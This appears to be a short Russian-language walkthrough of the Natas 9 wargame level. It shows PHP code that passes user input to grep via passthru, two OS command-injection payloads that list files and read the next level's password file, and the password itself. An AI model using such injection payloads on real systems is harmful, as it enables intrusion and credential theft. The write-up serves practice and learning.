## Natas 9
Логиниимся. Страница опять нам даёт поле для ввода и говорит нам "Find words containing". Так же мы можем просмотреть код страницы.
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```
Если попросить чат-гпт разобрать его, то он скажет что он уязвим для OS command injection _(это выполнение произвольных команд ОС)_. Затем, для получения флага прописываем команду:
```bash
|| ls -la #
```
и видим тот самый dictionary.txt и пару других файлов

затем прописываем:
```bash
|| cat /etc/natas_webpass/natas10 #
```
и нам даётся пароль для следующего уровня: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

ещё рекомендую найти любую шпору по линуксу и играться с командами, это неиронично интересно